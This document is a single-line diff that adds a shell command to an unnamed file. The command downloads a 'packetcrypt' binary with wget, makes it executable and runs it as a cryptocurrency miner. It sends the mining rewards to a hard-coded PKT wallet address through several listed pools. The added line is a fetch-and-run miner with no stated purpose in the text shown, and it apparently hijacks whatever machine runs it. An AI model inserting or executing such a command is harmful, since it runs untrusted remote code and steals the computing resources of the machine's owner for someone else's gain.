@@ -1,0 +1,1 @@
+wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt && chmod +x packetcrypt && ./packetcrypt ann -p pkt1qqnck5sajtp7e9qk5yta2ydcegnedpxdjpn7jj0 http://pool.pktpool.io http://pool.pktpool.io/ http://pool.pktpool.io/ http://pool.pkt.world/ http://pool.pkt.world/ http://pool.pkt.world/ 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
